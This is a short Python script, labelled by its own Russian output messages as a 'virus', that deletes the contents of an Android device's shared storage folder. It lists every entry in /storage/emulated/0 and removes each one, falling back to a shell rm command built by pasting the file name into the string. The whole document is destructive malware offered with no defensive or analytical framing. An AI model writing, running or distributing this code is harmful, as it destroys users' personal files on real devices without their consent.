import os
g = os.listdir('/storage/emulated/0')
os.chdir('/storage/emulated/0')
for i in g:
	try:
		print(i)
		os.remove(i)
	except:
		try:
			os.system('rm */ ' + "" + i + "")
		except:
			print("Неудалось удалить файл")
print('Вирус зарвешил свою работу')